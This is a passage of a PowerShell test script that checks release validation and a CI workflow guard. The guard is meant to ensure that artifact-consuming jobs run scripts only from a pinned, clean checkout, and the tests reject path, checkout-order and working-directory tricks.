param([switch] $SourceGuardOnly)

$ErrorActionPreference = 'Stop'
. (Join-Path $PSScriptRoot '../build/Invoke-NestedPwsh.ps1')
$root = (Resolve-Path (Join-Path $PSScriptRoot '..')).Path
$validator = Join-Path $root 'scripts/validate-release.ps1'
$projectFile = Join-Path $root 'src/KeelMatrix.PackageSurface.Cli/KeelMatrix.PackageSurface.Cli.csproj'
$realChangelog = Join-Path $root 'CHANGELOG.md'
$workflowDirectory = Join-Path $root '.github/workflows'
$ciWorkflowPath = Join-Path $workflowDirectory 'ci.yml'
$releaseWorkflowPath = Join-Path $workflowDirectory 'release.yml'
$localGatePath = Join-Path $root 'scripts/run-local-gate.ps1'
$builtCliPath = Join-Path $root 'src/KeelMatrix.PackageSurface.Cli/bin/Release/net8.0/KeelMatrix.PackageSurface.dll'
$artifactSetValidatorPath = Join-Path $root 'scripts/validate-release-artifact-set.ps1'
$scratch = Join-Path ([IO.Path]::GetTempPath()) ('packagesurface-release-contract-' + [Guid]::NewGuid().ToString('N'))
New-Item -ItemType Directory -Force -Path $scratch | Out-Null

function Invoke-ReleaseValidation {
    param(
        [Parameter(Mandatory)] [string] $Version,
        [Parameter(Mandatory)] [string] $ChangelogPath,
        [switch] $RequireFinalized,
        [switch] $FirstRelease
    )

    $arguments = @(
        '-NoLogo',
        '-NoProfile',
        '-File',
        $validator,
        '-Version',
        $Version,
        '-ProjectFile',
        $projectFile,
        '-ChangelogPath',
        $ChangelogPath
    )
    if ($RequireFinalized) { $arguments += '-RequireFinalized' }
    if ($FirstRelease) { $arguments += '-FirstRelease' }
    $null = Invoke-NestedPwsh -ArgumentList $arguments 2>$null
    return $LASTEXITCODE
}

function Invoke-LocalGateVersionValidation {
    param([AllowEmptyString()] [string] $Version)

    $arguments = @(
        '-NoLogo',
        '-NoProfile',
        '-File',
        $localGatePath,
        '-ExpectedVersion',
        $Version
    )
    $null = Invoke-NestedPwsh -ArgumentList $arguments 2>$null
    return $LASTEXITCODE
}

function Assert-ValidationPass {
    param([Parameter(Mandatory)] [string] $Name, [Parameter(Mandatory)] [int] $ExitCode)
    if ($ExitCode -ne 0) { throw "Release-contract case '$Name' failed with exit code $ExitCode." }
}

function Assert-ValidationRejects {
    param([Parameter(Mandatory)] [string] $Name, [Parameter(Mandatory)] [int] $ExitCode)
    if ($ExitCode -eq 0) { throw "Release-contract case '$Name' was accepted." }
}

function Invoke-ArtifactSetValidation {
    param([AllowEmptyString()] [string] $Version, [Parameter(Mandatory)] [string] $Directory)
    $arguments = @('-NoLogo', '-NoProfile', '-File', $artifactSetValidatorPath, '-Version', $Version, '-ArtifactDirectory', $Directory)
    $null = Invoke-NestedPwsh -ArgumentList $arguments 2>$null
    return $LASTEXITCODE
}

function New-ArtifactSetDirectory {
    param([Parameter(Mandatory)] [string] $Name, [Parameter(Mandatory)] [string[]] $Files)
    $directory = Join-Path $scratch $Name
    New-Item -ItemType Directory -Force -Path $directory | Out-Null
    foreach ($file in $Files) { [IO.File]::WriteAllText((Join-Path $directory $file), '') }
    return $directory
}

function Add-WorkflowFixtureCheckout {
    param(
        [System.Collections.Generic.List[string]] $Lines,
        [int] $SequenceIndent,
        [int] $FieldIndent,
        [string] $CheckoutUses,
        [string] $CheckoutRepository,
        [switch] $IncludeCheckoutRepository,
        [string] $CheckoutPath,
        [switch] $IncludeCheckoutPath,
        [string] $CheckoutRef,
        [string] $ContinueOnError,
        [switch] $ConditionalCheckout
    )

    $Lines.Add((' ' * $SequenceIndent) + '- name: Check out source')
    $Lines.Add((' ' * $FieldIndent) + 'uses: ' + $CheckoutUses)
    if (-not [string]::IsNullOrWhiteSpace($ContinueOnError)) { $Lines.Add((' ' * $FieldIndent) + 'continue-on-error: ' + $ContinueOnError) }
    if ($ConditionalCheckout) { $Lines.Add((' ' * $FieldIndent) + 'if: ${{ always() }}') }
    $Lines.Add((' ' * $FieldIndent) + 'with:')
    if ($IncludeCheckoutRepository) { $Lines.Add((' ' * ($FieldIndent + 2)) + 'repository: ' + $CheckoutRepository) }
    if ($IncludeCheckoutPath) { $Lines.Add((' ' * ($FieldIndent + 2)) + 'path: ' + $CheckoutPath) }
    $Lines.Add((' ' * ($FieldIndent + 2)) + 'ref: ' + $CheckoutRef)
}

function Add-WorkflowFixtureDownload {
    param(
        [System.Collections.Generic.List[string]] $Lines,
        [int] $SequenceIndent,
        [int] $FieldIndent,
        [string] $Path = 'artifacts',
        [switch] $OmitPath
    )

    $Lines.Add((' ' * $SequenceIndent) + '- name: Download packages')
    $Lines.Add((' ' * $FieldIndent) + "uses: 'actions/download-artifact@v4'")
    if (-not $OmitPath) {
        $Lines.Add((' ' * $FieldIndent) + 'with:')
        $Lines.Add((' ' * ($FieldIndent + 2)) + 'path: ' + $Path)
    }
}

function Add-WorkflowFixtureScripts {
    param([System.Collections.Generic.List[string]] $Lines, [int] $SequenceIndent, [int] $FieldIndent, [string[]] $ScriptPaths)

    $Lines.Add((' ' * $SequenceIndent) + '- name: Validate packages')
    $Lines.Add((' ' * $FieldIndent) + 'run: |')
    foreach ($currentScript in $ScriptPaths) {
        $Lines.Add((' ' * ($FieldIndent + 2)) + 'pwsh -NoLogo -NoProfile -File ./' + $currentScript)
    }
}

function New-WorkflowScriptConsumerFixture {
    param(
        [string] $ScriptPath,
        [string[]] $ScriptPaths = @(),
        [string] $JobName = 'future-consumer',
        [int] $JobIndent = 2,
        [string] $CheckoutUses = 'actions/checkout@v4',
        [string] $CheckoutRepository,
        [string] $CheckoutPath,
        [string] $CheckoutRef = '${{ github.sha }}',
        [switch] $ConditionalCheckout,
        [switch] $OmitCheckout,
        [ValidateSet('before-download', 'after-download', 'after-script')]
        [string] $CheckoutOrder = 'before-download',
        [ValidateSet('none', 'before-download', 'after-download', 'between-scripts')]
        [string] $SecondCheckoutOrder = 'none',
        [string] $SecondCheckoutUses = 'actions/checkout@v4',
        [string] $SecondCheckoutRepository,
        [string] $SecondCheckoutPath,
        [string] $SecondCheckoutRef = '${{ github.sha }}',
        [switch] $ConditionalSecondCheckout,
        [switch] $SecondArtifactDownload,
        [switch] $FinalValidCheckout,
        [string] $FinalCheckoutContinueOnError
    )

    if ($ScriptPaths.Count -eq 0) { $ScriptPaths = @($ScriptPath) }
    $lines = [Collections.Generic.List[string]]::new()
    $lines.Add('jobs:')
    $lines.Add((' ' * $JobIndent) + $JobName + ':')
    $lines.Add((' ' * ($JobIndent + 2)) + 'steps:')
    $sequenceIndent = $JobIndent + 4
    $fieldIndent = $sequenceIndent + 2
    $includeCheckoutRepository = $PSBoundParameters.ContainsKey('CheckoutRepository')
    $includeCheckoutPath = $PSBoundParameters.ContainsKey('CheckoutPath')
    $includeSecondCheckoutRepository = $PSBoundParameters.ContainsKey('SecondCheckoutRepository')
    $includeSecondCheckoutPath = $PSBoundParameters.ContainsKey('SecondCheckoutPath')
    if (-not $OmitCheckout -and $CheckoutOrder -eq 'before-download') {
        Add-WorkflowFixtureCheckout -Lines $lines -SequenceIndent $sequenceIndent -FieldIndent $fieldIndent -CheckoutUses $CheckoutUses -CheckoutRepository $CheckoutRepository -IncludeCheckoutRepository:$includeCheckoutRepository -CheckoutPath $CheckoutPath -IncludeCheckoutPath:$includeCheckoutPath -CheckoutRef $CheckoutRef -ConditionalCheckout:$ConditionalCheckout
    }
    if ($SecondCheckoutOrder -eq 'before-download') {
        Add-WorkflowFixtureCheckout -Lines $lines -SequenceIndent $sequenceIndent -FieldIndent $fieldIndent -CheckoutUses $SecondCheckoutUses -CheckoutRepository $SecondCheckoutRepository -IncludeCheckoutRepository:$includeSecondCheckoutRepository -CheckoutPath $SecondCheckoutPath -IncludeCheckoutPath:$includeSecondCheckoutPath -CheckoutRef $SecondCheckoutRef -ConditionalCheckout:$ConditionalSecondCheckout
    }
    Add-WorkflowFixtureDownload -Lines $lines -SequenceIndent $sequenceIndent -FieldIndent $fieldIndent
    if (-not $OmitCheckout -and $CheckoutOrder -eq 'after-download') {
        Add-WorkflowFixtureCheckout -Lines $lines -SequenceIndent $sequenceIndent -FieldIndent $fieldIndent -CheckoutUses $CheckoutUses -CheckoutRepository $CheckoutRepository -IncludeCheckoutRepository:$includeCheckoutRepository -CheckoutPath $CheckoutPath -IncludeCheckoutPath:$includeCheckoutPath -CheckoutRef $CheckoutRef -ConditionalCheckout:$ConditionalCheckout
    }
    if ($SecondCheckoutOrder -eq 'after-download') {
        Add-WorkflowFixtureCheckout -Lines $lines -SequenceIndent $sequenceIndent -FieldIndent $fieldIndent -CheckoutUses $SecondCheckoutUses -CheckoutRepository $SecondCheckoutRepository -IncludeCheckoutRepository:$includeSecondCheckoutRepository -CheckoutPath $SecondCheckoutPath -IncludeCheckoutPath:$includeSecondCheckoutPath -CheckoutRef $SecondCheckoutRef -ConditionalCheckout:$ConditionalSecondCheckout
    }
    if ($SecondArtifactDownload) { Add-WorkflowFixtureDownload -Lines $lines -SequenceIndent $sequenceIndent -FieldIndent $fieldIndent }
    if ($FinalValidCheckout) {
        Add-WorkflowFixtureCheckout -Lines $lines -SequenceIndent $sequenceIndent -FieldIndent $fieldIndent -CheckoutUses 'actions/checkout@v4' -CheckoutRepository '${{ github.repository }}' -IncludeCheckoutRepository -CheckoutPath '.' -IncludeCheckoutPath -CheckoutRef '${{ github.sha }}' -ContinueOnError $FinalCheckoutContinueOnError
    }
    Add-WorkflowFixtureScripts -Lines $lines -SequenceIndent $sequenceIndent -FieldIndent $fieldIndent -ScriptPaths $ScriptPaths
    if ($SecondCheckoutOrder -eq 'between-scripts') {
        Add-WorkflowFixtureCheckout -Lines $lines -SequenceIndent $sequenceIndent -FieldIndent $fieldIndent -CheckoutUses $SecondCheckoutUses -CheckoutRepository $SecondCheckoutRepository -IncludeCheckoutRepository:$includeSecondCheckoutRepository -CheckoutPath $SecondCheckoutPath -IncludeCheckoutPath:$includeSecondCheckoutPath -CheckoutRef $SecondCheckoutRef -ConditionalCheckout:$ConditionalSecondCheckout
        Add-WorkflowFixtureScripts -Lines $lines -SequenceIndent $sequenceIndent -FieldIndent $fieldIndent -ScriptPaths $ScriptPaths
    }
    if (-not $OmitCheckout -and $CheckoutOrder -eq 'after-script') {
        Add-WorkflowFixtureCheckout -Lines $lines -SequenceIndent $sequenceIndent -FieldIndent $fieldIndent -CheckoutUses $CheckoutUses -CheckoutRepository $CheckoutRepository -IncludeCheckoutRepository:$includeCheckoutRepository -CheckoutPath $CheckoutPath -IncludeCheckoutPath:$includeCheckoutPath -CheckoutRef $CheckoutRef -ConditionalCheckout:$ConditionalCheckout
    }
    return ($lines -join [Environment]::NewLine)
}

function Add-WorkflowFixturePathEnvironment {
    param([string] $Fixture, [ValidateSet('workflow', 'job', 'step')] [string] $Scope, [ValidateSet('block', 'flow')] [string] $Style, [string] $Key)

    $newline = [Environment]::NewLine
    $mapping = if ($Style -eq 'flow') { 'env: { ' + $Key + ": '/workspace/artifacts' }" } else { 'env:' + $newline + '  ' + $Key + ": '/workspace/artifacts'" }
    if ($Scope -eq 'workflow') { return $Fixture.Replace('jobs:', $mapping + $newline + 'jobs:') }
    if ($Scope -eq 'job') {
        $jobHeader = '  future-consumer:' + $newline + '    steps:'
        $jobMapping = if ($Style -eq 'flow') { '    ' + $mapping + $newline + '    steps:' } else { '    env:' + $newline + '      ' + $Key + ": '/workspace/artifacts'" + $newline + '    steps:' }
        return $Fixture.Replace($jobHeader, '  future-consumer:' + $newline + $jobMapping)
    }

    $stepStart = '      - name: Validate packages' + $newline + '        run: |'
    $stepMapping = if ($Style -eq 'flow') {
        '      - name: Validate packages' + $newline + '        ' + $mapping + $newline + '        run: |'
    }
    else {
        '      - name: Validate packages' + $newline + '        env:' + $newline + '          ' + $Key + ": '/workspace/artifacts'" + $newline + '        run: |'
    }
    return $Fixture.Replace($stepStart, $stepMapping)
}

function Add-WorkflowFixtureRunSteps {
    param([System.Collections.Generic.List[string]] $Lines, [object[]] $RunSteps)

    foreach ($runStep in $RunSteps) {
        $Lines.Add('      - name: ' + [string]$runStep.Name)
        if ($runStep.ContainsKey('If') -and $runStep.If) { $Lines.Add('        if: ${{ always() }}') }
        if ($runStep.ContainsKey('EnvText')) { $Lines.Add('        env: ' + [string]$runStep.EnvText) }
        if ($runStep.ContainsKey('EnvLines')) {
            $Lines.Add('        env:')
            foreach ($envLine in $runStep.EnvLines) { $Lines.Add('          ' + [string]$envLine) }
        }
        if ($runStep.ContainsKey('Uses')) {
            $Lines.Add('        uses: ' + [string]$runStep.Uses)
            if ($runStep.ContainsKey('With')) {
                $Lines.Add('        with:')
                foreach ($withKey in $runStep.With.Keys) { $Lines.Add('          ' + [string]$withKey + ': ' + [string]$runStep.With[$withKey]) }
            }
            continue
        }
        if ($runStep.ContainsKey('Shell')) { $Lines.Add('        shell: ' + [string]$runStep.Shell) }
        if ($runStep.ContainsKey('WorkingDirectory')) { $Lines.Add('        working-directory: ' + [string]$runStep.WorkingDirectory) }
        if ($runStep.ContainsKey('ContinueOnError')) { $Lines.Add('        continue-on-error: ' + [string]$runStep.ContinueOnError) }
        $runText = [string]$runStep.Text
        $runLines = @($runText -split "`r?`n")
        if ($runLines.Count -gt 1) {
            $Lines.Add('        run: |')
            foreach ($runLine in $runLines) { $Lines.Add('          ' + $runLine) }
        }
        else { $Lines.Add('        run: ' + $runText) }
    }
}

function New-WorkflowGitScriptConsumerFixture {
    param(
        [Parameter(Mandatory)] [string] $ScriptPath,
        [object[]] $RunsBeforeDownload = @(),
        [object[]] $RunsAfterDownload = @(),
        [object[]] $RunsBetweenInvocations = @(),
        [switch] $SecondInvocation,
        [string] $DownloadPath = 'artifacts',
        [switch] $OmitDownloadPath
    )

    $lines = [Collections.Generic.List[string]]::new()
    $lines.Add('jobs:')
    $lines.Add('  future-consumer:')
    $lines.Add('    steps:')
    Add-WorkflowFixtureCheckout -Lines $lines -SequenceIndent 6 -FieldIndent 8 -CheckoutUses 'actions/checkout@v4' -CheckoutRef '${{ github.sha }}'
    Add-WorkflowFixtureRunSteps -Lines $lines -RunSteps $RunsBeforeDownload
    Add-WorkflowFixtureDownload -Lines $lines -SequenceIndent 6 -FieldIndent 8 -Path $DownloadPath -OmitPath:$OmitDownloadPath
    Add-WorkflowFixtureRunSteps -Lines $lines -RunSteps $RunsAfterDownload
    Add-WorkflowFixtureScripts -Lines $lines -SequenceIndent 6 -FieldIndent 8 -ScriptPaths @($ScriptPath)
    if ($SecondInvocation) {
        Add-WorkflowFixtureRunSteps -Lines $lines -RunSteps $RunsBetweenInvocations
        Add-WorkflowFixtureScripts -Lines $lines -SequenceIndent 6 -FieldIndent 8 -ScriptPaths @($ScriptPath)
    }
    return ($lines -join [Environment]::NewLine)
}

function New-WorkflowRunnerTempRedirectFixture {
    param(
        [Parameter(Mandatory)] [string] $ScriptPath,
        [Parameter(Mandatory)] [string] $LinkText,
        [Parameter(Mandatory)] [string] $WriteText,
        [Parameter(Mandatory)] [string] $Shell,
        [Parameter(Mandatory)] [ValidateSet('before artifact download', 'after artifact download', 'between guarded invocations')] [string] $Position,
        [switch] $IncludeShellCheckout
    )

    $lines = [Collections.Generic.List[string]]::new()
    $lines.Add('jobs:')
    $lines.Add('  future-consumer:')
    $lines.Add('    steps:')
    Add-WorkflowFixtureCheckout -Lines $lines -SequenceIndent 6 -FieldIndent 8 -CheckoutUses 'actions/checkout@v4' -CheckoutRef '${{ github.sha }}'

    $linkStep = @{ Name = 'Create a runner-temp path redirect'; Text = $LinkText; Shell = $Shell }
    $writeStep = @{ Name = 'Write through the runner-temp path'; Text = $WriteText; Shell = $Shell }
    $shellCheckoutStep = if ($Shell -match '^(?i:bash|sh)$') {
        @{ Name = 'Keep the pinned shell source'; Text = 'git checkout --detach ''${{ github.sha }}'''; Shell = $Shell }
    }
    else {
        @{ Name = 'Keep the pinned shell source'; Text = 'git -C "$env:GITHUB_WORKSPACE" switch --detach $env:GITHUB_SHA'; Shell = $Shell }
    }
    $validCheckout = @{
        Lines = $lines
        SequenceIndent = 6
        FieldIndent = 8
        CheckoutUses = 'actions/checkout@v4'
        CheckoutRepository = '${{ github.repository }}'
        IncludeCheckoutRepository = $true
        CheckoutPath = '.'
        IncludeCheckoutPath = $true
        CheckoutRef = '${{ github.sha }}'
    }

    if ($Position -eq 'before artifact download') {
        Add-WorkflowFixtureRunSteps -Lines $lines -RunSteps @($linkStep)
        if ($IncludeShellCheckout) { Add-WorkflowFixtureRunSteps -Lines $lines -RunSteps @($shellCheckoutStep) }
        Add-WorkflowFixtureDownload -Lines $lines -SequenceIndent 6 -FieldIndent 8
        Add-WorkflowFixtureCheckout @validCheckout
        Add-WorkflowFixtureDownload -Lines $lines -SequenceIndent 6 -FieldIndent 8
    }
    elseif ($Position -eq 'after artifact download') {
        Add-WorkflowFixtureDownload -Lines $lines -SequenceIndent 6 -FieldIndent 8
        Add-WorkflowFixtureRunSteps -Lines $lines -RunSteps @($linkStep)
        if ($IncludeShellCheckout) { Add-WorkflowFixtureRunSteps -Lines $lines -RunSteps @($shellCheckoutStep) }
        Add-WorkflowFixtureCheckout @validCheckout
        Add-WorkflowFixtureDownload -Lines $lines -SequenceIndent 6 -FieldIndent 8
    }
    else {
        Add-WorkflowFixtureDownload -Lines $lines -SequenceIndent 6 -FieldIndent 8
        Add-WorkflowFixtureScripts -Lines $lines -SequenceIndent 6 -FieldIndent 8 -ScriptPaths @($ScriptPath)
        Add-WorkflowFixtureRunSteps -Lines $lines -RunSteps @($linkStep)
        if ($IncludeShellCheckout) { Add-WorkflowFixtureRunSteps -Lines $lines -RunSteps @($shellCheckoutStep) }
        Add-WorkflowFixtureCheckout @validCheckout
        Add-WorkflowFixtureDownload -Lines $lines -SequenceIndent 6 -FieldIndent 8
    }

    Add-WorkflowFixtureRunSteps -Lines $lines -RunSteps @($writeStep)
    Add-WorkflowFixtureScripts -Lines $lines -SequenceIndent 6 -FieldIndent 8 -ScriptPaths @($ScriptPath)
    return ($lines -join [Environment]::NewLine)
}

function Invoke-ReleaseWorkflowScriptSourceGuard {
    param(
        [Parameter(Mandatory)] [object[]] $Workflows,
        [Parameter(Mandatory)] [string] $RepositoryRoot,
        [string[]] $RequiredConsumerNames = @()
    )

    . (Join-Path $PSScriptRoot 'ReleaseWorkflowSourceGuard.ps1')
    return Assert-ArtifactScriptConsumersHaveSource -Workflows $Workflows -RepositoryRoot $RepositoryRoot -RequiredConsumerNames $RequiredConsumerNames
}

function Assert-WorkflowScriptSourceRegressionCoverage {
    param(
        [Parameter(Mandatory)] [AllowEmptyCollection()] [object[]] $CurrentConsumers,
        [Parameter(Mandatory)] [string] $RepositoryRoot
    )

    $script = if ($CurrentConsumers.Count -gt 0) { [string]$CurrentConsumers[0].Scripts[0] } else { 'scripts/validate-release-artifact-set.ps1' }
    $backslash = [string][char]92
    $dotBackslash = '.' + $backslash
    $slashBackslash = './' + $backslash
    $dotBackslashDotSlash = $dotBackslash + './'

    . (Join-Path $PSScriptRoot 'ReleaseWorkflowSourceGuard.ps1')
    foreach ($case in @(
        @{ Name = 'Windows drive path with dot segments'; Root = 'C:\workspace\repo'; Path = 'c:\workspace\repo\src\..\scripts'; Expected = 'scripts' },
        @{ Name = 'Windows root-relative path'; Root = 'C:\workspace\repo'; Path = '\workspace\repo\src\..\scripts'; Expected = 'scripts' },
        @{ Name = 'POSIX path with dot segments'; Root = '/workspace/repo'; Path = '/workspace/repo/src/../scripts'; Expected = 'scripts' },
        @{ Name = 'POSIX path with duplicate leading separators'; Root = '/workspace/repo'; Path = '//workspace/repo/src/../scripts'; Expected = 'scripts' },
        @{ Name = 'UNC path with dot segments and case variant'; Root = '\\server\share\repo'; Path = '\\SERVER\share\repo\src\..\scripts'; Expected = 'scripts' },
        @{ Name = 'absolute sibling sharing a textual prefix'; Root = 'C:\workspace\repo'; Path = 'C:\workspace\repository\scripts'; Expected = $null },
        @{ Name = 'absolute path escaping the workspace'; Root = 'C:\workspace\repo'; Path = 'C:\workspace\repo\..\outside'; Expected = $null },
        @{ Name = 'POSIX path with case-distinct sibling'; Root = '/workspace/repo'; Path = '/workspace/Repo/scripts'; Expected = $null }
    )) {
        $actual = Get-WorkflowAbsoluteWorkspacePath -Path $case.Path -RepositoryRoot $case.Root
        if ($null -eq $case.Expected) {
            if ($null -ne $actual) { throw "Absolute workspace normalization accepted $($case.Name)." }
        }
        elseif ($actual -cne $case.Expected) { throw "Absolute workspace normalization misclassified $($case.Name): '$actual'." }
    }
    foreach ($shell in @('cmd', 'cmd.exe /c {0}', 'C:\Windows\System32\cmd.exe /c {0}', '"C:\Windows\System32\cmd.exe" /c {0}')) {
        if (-not (Test-WorkflowCmdShell -Shell $shell)) { throw "cmd lookup did not recognize shell form '$shell'." }
    }
    if (-not (Test-WorkflowEnvironmentValueDisablesCmdCurrentDirectory -Value '') -or -not (Test-WorkflowEnvironmentValueDisablesCmdCurrentDirectory -Value '${{ matrix.value }}')) {
        throw 'The presence of NoDefaultCurrentDirectoryInExePath must disable cmd current-directory search regardless of its value.'
    }
    foreach ($case in @(
        @{ Name = 'Windows drive artifact output'; Root = 'C:\workspace\repo'; Path = 'C:\workspace\repo\src\..\artifacts'; Expected = 'artifacts' },
        @{ Name = 'UNC artifact output'; Root = '\\server\share\repo'; Path = '\\SERVER\share\repo\src\..\artifacts'; Expected = 'artifacts' },
        @{ Name = 'POSIX artifact output'; Root = '/workspace/repo'; Path = '/workspace/repo/src/../artifacts'; Expected = 'artifacts' },
        @{ Name = 'POSIX artifact output with duplicate leading separators'; Root = '/workspace/repo'; Path = '//workspace/repo/src/../artifacts'; Expected = 'artifacts' }
    )) {
        $step = [pscustomobject]@{ With = @{ path = $case.Path } }
        $output = Get-WorkflowArtifactOutputLocation -Step $step -Context $case.Name -RepositoryRoot $case.Root
        if ($output.Kind -ne 'workspace' -or $output.Path -cne $case.Expected) { throw "Artifact output normalization misclassified $($case.Name)." }
    }
    if ($null -ne (Normalize-WorkflowAbsolutePath -Path '\\?\C:\workspace\repo\artifacts')) { throw 'An unsupported Windows device path was normalized as an ordinary absolute path.' }
    if ($null -ne (Normalize-WorkflowAbsolutePathForRepository -Path '\workspace\repo\artifacts' -RepositoryRoot '\\server\share\repo')) {
        throw 'A root-relative Windows path on a UNC checkout must remain unresolved.'
    }
    $driveRelativeOutput = [pscustomobject]@{ Kind = 'workspace'; Path = 'artifacts'; RepositoryRoot = 'C:\workspace\repo' }
    if (-not (Test-WorkflowTokenTargetsArtifactOutput -Token 'C:rewrite.exe' -ArtifactOutputPaths @($driveRelativeOutput) -WorkingDirectory 'artifacts' -Shell 'cmd' -CheckCmdLookup)) {
        throw 'A drive-relative executable token must fail closed.'
    }
    foreach ($text in @('[System.Environment]::CurrentDirectory = "artifacts"', '[System.IO.Directory]::SetCurrentDirectory("artifacts")')) {
        if (-not (Test-WorkflowRunContainsUnsupportedEvaluator -Text $text -Shell 'pwsh' -ArtifactOutputPaths @($driveRelativeOutput) -WorkingDirectory '.')) {
            throw "An unsupported .NET working-directory change was not rejected: $text"
        }
    }

    $fourSpaceJob = New-WorkflowScriptConsumerFixture -ScriptPath $script -JobIndent 4
    $fourSpaceResult = @(Invoke-ReleaseWorkflowScriptSourceGuard -Workflows @(@{ Name = 'four-space.yml'; Text = $fourSpaceJob }) -RepositoryRoot $RepositoryRoot)
    if ($fourSpaceResult.Count -ne 1 -or $fourSpaceResult[0].Scripts -notcontains $script) {
        throw 'A valid four-space-indented job must be discovered and its tracked script validated.'
    }

    foreach ($rootPath in @('.', './', './.')) {
        $scalars = [Collections.Generic.List[string]]::new()
        $scalars.Add($rootPath)
        $scalars.Add("'" + $rootPath + "'")
        $scalars.Add('"' + $rootPath + '"')
        foreach ($scalar in $scalars) {
            $rootFixture = New-WorkflowScriptConsumerFixture -ScriptPath $script -CheckoutPath $scalar
            $rootResult = @(Invoke-ReleaseWorkflowScriptSourceGuard -Workflows @(@{ Name = 'portable-root.yml'; Text = $rootFixture }) -RepositoryRoot $RepositoryRoot -RequiredConsumerNames @('portable-root.yml/future-consumer'))
            if ($rootResult.Count -ne 1 -or $rootResult[0].Scripts -notcontains $script) {
                throw "Portable workspace-root checkout scalar '$scalar' was rejected."
            }
        }
    }

    $cleanTrueFixture = New-WorkflowScriptConsumerFixture -ScriptPath $script
    $cleanTrueFixture = $cleanTrueFixture.Replace('          ref: ${{ github.sha }}', ('          clean: true' + [Environment]::NewLine + '          ref: ${{ github.sha }}'))
    $cleanTrueResult = @(Invoke-ReleaseWorkflowScriptSourceGuard -Workflows @(@{ Name = 'clean-true.yml'; Text = $cleanTrueFixture }) -RepositoryRoot $RepositoryRoot -RequiredConsumerNames @('clean-true.yml/future-consumer'))
    if ($cleanTrueResult.Count -ne 1 -or $cleanTrueResult[0].Scripts -notcontains $script) { throw 'An explicit clean: true checkout must remain a valid pinned-source control.' }
    foreach ($cleanValue in @('false', '${{ inputs.clean }}')) {
        $uncleanFixture = New-WorkflowScriptConsumerFixture -ScriptPath $script
        $uncleanFixture = $uncleanFixture.Replace('          ref: ${{ github.sha }}', ('          clean: ' + $cleanValue + [Environment]::NewLine + '          ref: ${{ github.sha }}'))
        $rejected = $false
        try { $null = Invoke-ReleaseWorkflowScriptSourceGuard -Workflows @(@{ Name = 'unclean-checkout.yml'; Text = $uncleanFixture }) -RepositoryRoot $RepositoryRoot }
        catch { $rejected = $true }
        if (-not $rejected) { throw "Checkout clean value '$cleanValue' must not claim restored tracked content." }
    }
    $quotedUses = New-WorkflowScriptConsumerFixture -ScriptPath $script -CheckoutUses "'actions/checkout@v4'" -CheckoutPath "'./.'"
    $quotedResult = @(Invoke-ReleaseWorkflowScriptSourceGuard -Workflows @(@{ Name = 'quoted-uses.yml'; Text = $quotedUses }) -RepositoryRoot $RepositoryRoot -RequiredConsumerNames @('quoted-uses.yml/future-consumer'))
    if ($quotedResult.Count -ne 1 -or $quotedResult[0].Scripts -notcontains $script) { throw 'Quoted action uses and a quoted portable workspace-root path must pass.' }

    $rejectedCases = @(
        @{ Name = 'dot plus backslash checkout path'; Text = (New-WorkflowScriptConsumerFixture -ScriptPath $script -CheckoutPath ("'" + $dotBackslash + "'")) },
        @{ Name = 'mixed-separator checkout path'; Text = (New-WorkflowScriptConsumerFixture -ScriptPath $script -CheckoutPath ("'" + $slashBackslash + "'")) },
        @{ Name = 'mixed-separator dot checkout path'; Text = (New-WorkflowScriptConsumerFixture -ScriptPath $script -CheckoutPath ("'" + $dotBackslashDotSlash + "'")) },
        @{ Name = 'checkout into a subdirectory'; Text = (New-WorkflowScriptConsumerFixture -ScriptPath $script -CheckoutPath 'source') },
        @{ Name = 'quoted checkout into a subdirectory'; Text = (New-WorkflowScriptConsumerFixture -ScriptPath $script -CheckoutPath "'./source'") },
        @{ Name = 'checkout path that normalizes through a subdirectory'; Text = (New-WorkflowScriptConsumerFixture -ScriptPath $script -CheckoutPath 'source/..') },
        @{ Name = 'conditional checkout'; Text = (New-WorkflowScriptConsumerFixture -ScriptPath $script -ConditionalCheckout) },
        @{ Name = 'checkout after artifact download'; Text = (New-WorkflowScriptConsumerFixture -ScriptPath $script -CheckoutOrder 'after-download') },
        @{ Name = 'later checkout after artifact download replaces pinned revision'; Text = (New-WorkflowScriptConsumerFixture -ScriptPath $script -SecondCheckoutOrder 'after-download' -SecondCheckoutRef 'main') },
        @{ Name = 'later checkout before artifact download replaces pinned revision'; Text = (New-WorkflowScriptConsumerFixture -ScriptPath $script -SecondCheckoutOrder 'before-download' -SecondCheckoutRef 'main') },
        @{ Name = 'checkout state before a later artifact download remains required'; Text = (New-WorkflowScriptConsumerFixture -ScriptPath $script -SecondCheckoutOrder 'after-download' -SecondCheckoutRef 'main' -SecondArtifactDownload -FinalValidCheckout) },
        @{ Name = 'later checkout after artifact download selects another repository'; Text = (New-WorkflowScriptConsumerFixture -ScriptPath $script -SecondCheckoutOrder 'after-download' -SecondCheckoutRepository 'other/repository') },
        @{ Name = 'later checkout after artifact download uses a non-root path'; Text = (New-WorkflowScriptConsumerFixture -ScriptPath $script -SecondCheckoutOrder 'after-download' -SecondCheckoutPath 'source') },
        @{ Name = 'conditional later checkout may replace pinned revision'; Text = (New-WorkflowScriptConsumerFixture -ScriptPath $script -SecondCheckoutOrder 'after-download' -SecondCheckoutRef 'main' -ConditionalSecondCheckout) },
        @{ Name = 'later checkout between guarded script invocations'; Text = (New-WorkflowScriptConsumerFixture -ScriptPath $script -SecondCheckoutOrder 'between-scripts' -SecondCheckoutRef 'main') },
        @{ Name = 'checkout after script invocation'; Text = (New-WorkflowScriptConsumerFixture -ScriptPath $script -CheckoutOrder 'after-script') },
        @{ Name = 'checkout of a different revision'; Text = (New-WorkflowScriptConsumerFixture -ScriptPath $script -CheckoutRef 'main') },
        @{ Name = 'checkout of a different repository'; Text = (New-WorkflowScriptConsumerFixture -ScriptPath $script -CheckoutRepository 'other/repository') },
        @{ Name = 'script path with different casing'; Text = (New-WorkflowScriptConsumerFixture -ScriptPath $script.ToUpperInvariant()) },
        @{ Name = 'missing checkout'; Text = (New-WorkflowScriptConsumerFixture -ScriptPath $script -OmitCheckout) },
        @{ Name = 'four-space job with missing checkout'; Text = (New-WorkflowScriptConsumerFixture -ScriptPath $script -JobIndent 4 -OmitCheckout) }
    )
    foreach ($case in $rejectedCases) {
        $rejected = $false
        try {
            $null = Invoke-ReleaseWorkflowScriptSourceGuard -Workflows @(@{ Name = 'regression.yml'; Text = $case.Text }) -RepositoryRoot $RepositoryRoot
        }
        catch { $rejected = $true }
        if (-not $rejected) { throw "Workflow contract accepted a consumer with $($case.Name)." }
    }

    $finalValidFixture = New-WorkflowScriptConsumerFixture -ScriptPath $script -SecondCheckoutOrder 'after-download' -SecondCheckoutRef 'main' -FinalValidCheckout
